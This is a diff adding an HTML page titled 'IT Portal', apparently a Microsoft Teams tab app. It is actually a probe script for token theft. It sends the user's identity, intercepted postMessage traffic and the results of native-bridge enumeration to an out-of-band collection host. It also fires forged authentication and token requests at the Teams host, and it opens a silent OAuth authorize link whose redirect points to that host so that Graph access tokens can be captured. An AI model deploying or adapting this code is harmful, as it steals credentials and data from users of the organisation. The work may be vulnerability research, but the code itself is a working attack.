@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>IT Portal</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+</head>
+<body style="margin:0;font-family:'Segoe UI',sans-serif;background:#f5f5f5;">
+<div id="s" style="padding:12px;font-size:11px;color:#333;word-break:break-all;"></div>
+<script>
+var C='yeedjuciskcfxiwyajuv9mw912uaxqx0t.oast.fun';
+var log=[];
+function s(m){log.push(m);document.getElementById('s').innerHTML=log.join('<br>');}
+function ex(path,data){
+  var p=Object.keys(data).map(function(k){return k+'='+encodeURIComponent(String(data[k]||'none').substring(0,400))}).join('&');
+  fetch('https://'+C+'/'+path+'?'+p).catch(function(){new Image().src='https://'+C+'/'+path+'?'+p;});
+}
+
+(async function(){
+  await microsoftTeams.app.initialize();
+  var ctx=await microsoftTeams.app.getContext();
+  s('SDK OK: '+ctx.user.userPrincipalName);
+
+  // ============================================================
+  // TEST 1: postMessage interception — sniff Teams SDK comms
+  // ============================================================
+  s('--- postMessage Sniffing ---');
+
+  var captured=[];
+
+  // Intercept ALL messages from any origin
+  window.addEventListener('message', function(e) {
+    var data;
+    try {
+      data = typeof e.data === 'object' ? JSON.stringify(e.data) : String(e.data);
+    } catch(err) {
+      data = String(e.data);
+    }
+
+    // Skip our own messages
+    if (data.indexOf(C) !== -1) return;
+    if (data.indexOf('probe-echo') !== -1) return;
+
+    captured.push({ origin: e.origin, data: data.substring(0, 500), ts: Date.now() });
+    s('MSG[' + e.origin + ']: ' + data.substring(0, 120));
+    ex('t5-msg', { origin: e.origin, data: data.substring(0, 400), idx: captured.length });
+  });
+
+  // Send various postMessage payloads to parent to try to trigger token/context responses
+  var probeMessages = [
+    // Teams SDK internal message formats
+    { id: 1, func: 'authentication.getAuthToken', args: [{ resource: 'https://graph.microsoft.com' }] },
+    { id: 2, func: 'authentication.getAuthToken', args: [] },
+    { id: 3, func: 'getContext', args: [] },
+    { id: 4, func: 'authentication.authenticate', args: [{ url: 'https://' + C + '/auth-probe' }] },
+    { id: 5, func: 'getUserJoinedTeams', args: [] },
+    { id: 6, func: 'getChatMembers', args: [] },
+    { id: 7, func: 'getConfigSetting', args: ['accessToken'] },
+    { id: 8, func: 'getConfigSetting', args: ['authToken'] },
+    { id: 9, func: 'getConfigSetting', args: ['skypeToken'] },
+    { id: 10, func: 'readSettingsForApp', args: [] },
+
+    // Raw string probes
+    'authentication.getAuthToken',
+    'getAuthToken',
+    'getToken',
+    'getContext',
+    'getSSOToken',
+
+    // Structured probes matching Teams SDK internals
+    { messageType: 'authentication.getAuthToken', requestId: 100 },
+    { messageType: 'getContext', requestId: 101 },
+    { messageType: 'tasks.getAuthToken', requestId: 102 },
+    { type: 'getToken', resource: 'https://graph.microsoft.com' },
+    { type: 'authentication.getAuthToken', resource: 'https://graph.microsoft.com' },
+
+    // nestedAppAuth probes (Teams nested app auth protocol)
+    { messageType: 'NestedAppAuth.Request', requestId: 200, clientId: '00000003-0000-0000-c000-000000000000', scope: 'https://graph.microsoft.com/.default' },
+    { messageType: 'NestedAppAuthRequest', requestId: 201, method: 'GetToken', params: { resource: 'https://graph.microsoft.com' } },
+    { type: 'NestedAppAuth', action: 'getToken', resource: 'https://graph.microsoft.com/.default' },
+  ];
+
+  for (var i = 0; i < probeMessages.length; i++) {
+    try {
+      window.parent.postMessage(probeMessages[i], '*');
+    } catch(e) {}
+  }
+  s('Sent ' + probeMessages.length + ' probe messages to parent');
+  ex('t5-probes-sent', { count: probeMessages.length });
+
+  // Wait a bit for responses
+  await new Promise(r => setTimeout(r, 3000));
+
+  // Report captured messages
+  if (captured.length > 0) {
+    s('CAPTURED ' + captured.length + ' responses!');
+    ex('t5-captured-count', { count: captured.length });
+    for (var j = 0; j < Math.min(captured.length, 10); j++) {
+      ex('t5-captured-' + j, { origin: captured[j].origin, data: captured[j].data });
+    }
+  } else {
+    s('No responses captured from parent');
+    ex('t5-no-responses', { sent: probeMessages.length });
+  }
+
+  // ============================================================
+  // TEST 2: app.openLink — universal links / app triggers
+  // ============================================================
+  s('--- app.openLink Tests ---');
+
+  var links = [
+    // Teams deep links that might expose data or trigger actions
+    { name: 'teams-settings', url: 'https://teams.microsoft.com/l/app/settings' },
+    { name: 'teams-admin', url: 'https://admin.teams.microsoft.com' },
+    { name: 'myapps', url: 'https://myapps.microsoft.com' },
+    { name: 'portal-azure', url: 'https://portal.azure.com' },
+
+    // OAuth endpoints that might auto-consent in app context
+    { name: 'oauth-graph', url: 'https://login.microsoftonline.com/' + ctx.user.tenant.id + '/oauth2/v2.0/authorize?client_id=04b07795-ee44-4b47-9eee-0614f9b214d7&response_type=token&redirect_uri=https://' + C + '/oauth-callback&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=' + encodeURIComponent(ctx.user.userPrincipalName) },
+
+    // iOS universal links / app schemes via HTTPS redirect
+    { name: 'oast-redirect-tel', url: 'https://' + C + '/redir?to=tel:+5511999999999' },
+    { name: 'oast-redirect-facetime', url: 'https://' + C + '/redir?to=facetime:' + encodeURIComponent(ctx.user.userPrincipalName) },
+    { name: 'oast-redirect-shortcuts', url: 'https://' + C + '/redir?to=shortcuts://run-shortcut?name=test' },
+    { name: 'oast-redirect-files', url: 'https://' + C + '/redir?to=shareddocuments://' },
+  ];
+
+  for (var k = 0; k < links.length; k++) {
+    try {
+      await microsoftTeams.app.openLink(links[k].url);
+      s('openLink[' + links[k].name + ']: CALLED');
+      ex('t5-openlink-' + links[k].name, { called: 'true' });
+      await new Promise(r => setTimeout(r, 800));
+    } catch(e) {
+      s('openLink[' + links[k].name + ']: ' + e.message);
+      ex('t5-openlink-' + links[k].name + '-err', { e: e.message });
+    }
+  }
+
+  // ============================================================
+  // TEST 3: WKWebView handler deep enumeration
+  // ============================================================
+  s('--- WKWebView Deep Enum ---');
+
+  try {
+    // Enumerate ALL properties of webkit.messageHandlers using Object methods
+    var foundHandlers = [];
+
+    if (window.webkit && window.webkit.messageHandlers) {
+      // Try Object.keys / getOwnPropertyNames
+      try {
+        var keys1 = Object.keys(window.webkit.messageHandlers);
+        if (keys1.length > 0) foundHandlers.push('keys:' + keys1.join(','));
+      } catch(e) {}
+
+      try {
+        var keys2 = Object.getOwnPropertyNames(window.webkit.messageHandlers);
+        if (keys2.length > 0) foundHandlers.push('ownProps:' + keys2.join(','));
+      } catch(e) {}
+
+      // Brute-force with Teams-specific handler names
+      var teamsHandlers = [
+        // Common Teams iOS internal names
+        'nativeInterface', 'TeamsNative', 'teamsNativeBridge', 'teamsMobile',
+        'MSTeams', 'msteams', 'microsoftTeams', 'teamsAuth',
+        'teamsSSO', 'teamsToken', 'teamsConfig', 'teamsApp',
+        'teamsMedia', 'teamsCall', 'teamsChat', 'teamsNotification',
+        'teamsNavigation', 'teamsDeepLink', 'teamsFile', 'teamsShare',
+        // React Native bridge names
+        'ReactNativeWebView', 'RNWebView', 'nativeApp', 'mobileApp',
+        // Cordova/Capacitor
+        'cordova', 'Cordova', 'capacitor', 'Capacitor',
+        // iOS specific
+        'observe', 'callbackHandler', 'interOp', 'interop',
+        'jsbridge', 'JSBridge', 'native', 'Native',
+        'webkit', 'webviewBridge', 'appBridge', 'AppBridge',
+        // Auth related
+        'ssoHandler', 'authHandler', 'tokenHandler', 'loginHandler',
+        'oauthHandler', 'msalHandler', 'adalHandler',
+        // Generic
+        'default', 'main', 'app', 'message', 'event', 'action',
+        'command', 'request', 'response', 'data', 'api',
+        // Numbered
+        'handler0', 'handler1', 'handler2', 'channel0', 'channel1',
+        // Common in Microsoft apps
+        'oneAuth', 'OneAuth', 'MSAL', 'msal', 'ADAL', 'adal',
+        'fluidBridge', 'officeBridge', 'OfficeBridge',
+        'telemetry', 'Telemetry', 'aria', 'Aria',
+        'performanceHandler', 'crashHandler', 'diagnostics',
+        // Accessibility
+        'voiceOver', 'accessibility', 'a11y',
+        // File handling
+        'fileHandler', 'documentHandler', 'downloadHandler',
+        'uploadHandler', 'cameraHandler', 'photoHandler',
+        'imageHandler', 'videoHandler', 'audioHandler',
+        // Biometric
+        'biometric', 'faceID', 'touchID', 'keychain',
+        // Push
+        'pushHandler', 'notificationHandler', 'apns',
+        // Clipboard
+        'clipboardHandler', 'pasteHandler',
+        // Location
+        'locationHandler', 'gpsHandler',
+        // Storage
+        'storageHandler', 'secureStorage', 'keychainHandler',
+        // Network
+        'networkHandler', 'httpHandler', 'fetchHandler',
+        // Calendar/Contacts
+        'calendarHandler', 'contactsHandler',
+        // Intune MAM
+        'intune', 'Intune', 'IntuneMAM', 'mamHandler', 'MAM',
+        'appConfig', 'AppConfig', 'managedConfig',
+        // Specific to Microsoft authenticator
+        'authenticator', 'Authenticator', 'brokerHandler',
+        'companyPortal', 'CompanyPortal'
+      ];
+
+      for (var h of teamsHandlers) {
+        try {
+          if (window.webkit.messageHandlers[h]) {
+            foundHandlers.push(h);
+            // Try to get info
+            try {
+              window.webkit.messageHandlers[h].postMessage({ action: 'getVersion' });
+              foundHandlers.push(h + ':invoked');
+            } catch(e2) {
+              foundHandlers.push(h + ':err:' + e2.message.substring(0, 30));
+            }
+          }
+        } catch(e) {}
+      }
+
+      // Try proto chain
+      try {
+        var proto = Object.getPrototypeOf(window.webkit.messageHandlers);
+        if (proto) {
+          var protoKeys = Object.getOwnPropertyNames(proto);
+          if (protoKeys.length > 0) foundHandlers.push('proto:' + protoKeys.join(','));
+        }
+      } catch(e) {}
+
+      // Try toString/valueOf
+      try {
+        foundHandlers.push('toString:' + String(window.webkit.messageHandlers));
+      } catch(e) {}
+
+      // Check webkit properties
+      try {
+        var wkKeys = Object.getOwnPropertyNames(window.webkit);
+        foundHandlers.push('webkit-props:' + wkKeys.join(','));
+      } catch(e) {}
+    }
+
+    s('Handlers: ' + (foundHandlers.length > 0 ? foundHandlers.join(' | ') : 'none found'));
+    ex('t5-wk-enum', { found: foundHandlers.join('|').substring(0, 400) || 'none' });
+
+    // Check if there are ANY JavaScript interfaces injected
+    var injected = [];
+    var globals = ['teams', 'Teams', 'MSTeams', 'msteams', 'nativeBridge', 'NativeBridge',
+                   'TeamsNative', 'teamsNative', 'appBridge', 'AppBridge', 'mobileBridge',
+                   '__teams', '__native', '__bridge', '_teamsNative', 'microsoftTeams_internal',
+                   'TeamsJS', 'teamsjs', '__TEAMS_SDK__', 'Android', 'flutter_inappwebview'];
+    for (var g of globals) {
+      try {
+        if (window[g] !== undefined && g !== 'microsoftTeams') {
+          injected.push(g + ':' + typeof window[g]);
+        }
+      } catch(e) {}
+    }
+    if (injected.length > 0) {
+      s('INJECTED GLOBALS: ' + injected.join(', '));
+      ex('t5-globals', { found: injected.join('|') });
+    } else {
+      s('No injected globals found');
+    }
+
+  } catch(e) {
+    s('WK enum error: ' + e.message);
+    ex('t5-wk-err', { e: e.message });
+  }
+
+  // ============================================================
+  // TEST 4: Nested App Auth (NAA) — newer Teams token protocol
+  // ============================================================
+  s('--- Nested App Auth ---');
+  try {
+    // NAA is a newer protocol where the Teams host acts as a broker
+    // Try to use it to get tokens without app registration
+    if (window.nestedAppAuth) {
+      s('nestedAppAuth global found!');
+      ex('t5-naa-found', { type: typeof window.nestedAppAuth });
+    }
+
+    // Try the MSAL nested app auth approach
+    // The host app (Teams) should respond to these messages
+    var naaRequest = {
+      messageType: 'NestedAppAuth.Request',
+      requestId: 'probe-' + Date.now(),
+      method: 'GetToken',
+      params: {
+        resource: 'https://graph.microsoft.com',
+        claims: '',
+        scopes: ['User.Read', 'Mail.Read']
+      }
+    };
+    window.parent.postMessage(naaRequest, '*');
+    window.parent.postMessage(JSON.stringify(naaRequest), '*');
+
+    // Also try the acquireTokenSilent pattern
+    var msalBroker = {
+      type: 'BrokerHandshake',
+      clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Teams web client ID
+      scope: 'https://graph.microsoft.com/.default'
+    };
+    window.parent.postMessage(msalBroker, '*');
+    window.parent.postMessage(JSON.stringify(msalBroker), '*');
+
+    s('NAA probes sent');
+    ex('t5-naa-probes', { sent: 'true' });
+  } catch(e) {
+    s('NAA error: ' + e.message);
+    ex('t5-naa-err', { e: e.message });
+  }
+
+  // Wait for any delayed responses
+  await new Promise(r => setTimeout(r, 5000));
+
+  // Final report
+  s('Total messages captured: ' + captured.length);
+  ex('t5-final', { totalMsgs: captured.length, tests: 'complete' });
+  s('--- test5 complete ---');
+})();
+</script>
+</body>
+</html>
